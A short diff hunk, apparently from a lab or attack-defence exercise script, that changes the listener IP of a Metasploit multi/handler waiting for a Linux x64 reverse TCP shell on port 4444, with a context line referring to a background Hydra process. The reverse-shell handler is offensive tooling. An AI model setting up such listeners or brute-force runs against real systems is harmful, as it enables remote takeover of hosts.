@@ -738,7 +738,7 @@ HYDRA_PID=$!
 msfconsole -q -x "
 use exploit/multi/handler;
 set payload linux/x64/shell_reverse_tcp;
-set LHOST 192.168.0.112;
+set LHOST 10.20.30.202;   # 6v6-attacker 내부 IP
 set LPORT 4444;
 exploit -j;
 " &
